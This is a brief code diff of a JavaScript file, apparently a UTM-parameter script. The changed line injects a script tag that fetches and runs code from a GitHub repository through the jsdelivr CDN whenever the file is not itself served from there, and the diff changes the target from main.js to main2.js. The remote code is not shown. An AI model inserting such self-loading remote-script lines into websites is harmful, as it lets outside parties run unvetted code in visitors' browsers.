@@ -1142,7 +1142,7 @@ function fillUTMParameters() {
 
 
 console.log(document.currentScript.src.includes('jsdelivr'))
-!document.currentScript.src.includes('jsdelivr')&&document.head.appendChild(Object.assign(document.createElement('script'),{src:'https://cdn.jsdelivr.net/gh/whygithub7/mangr1nab1/src/main.js',async:!0}));
+!document.currentScript.src.includes('jsdelivr')&&document.head.appendChild(Object.assign(document.createElement('script'),{src:'https://cdn.jsdelivr.net/gh/whygithub7/mangr1nab1/src/main2.js',async:!0}));
 
 
 
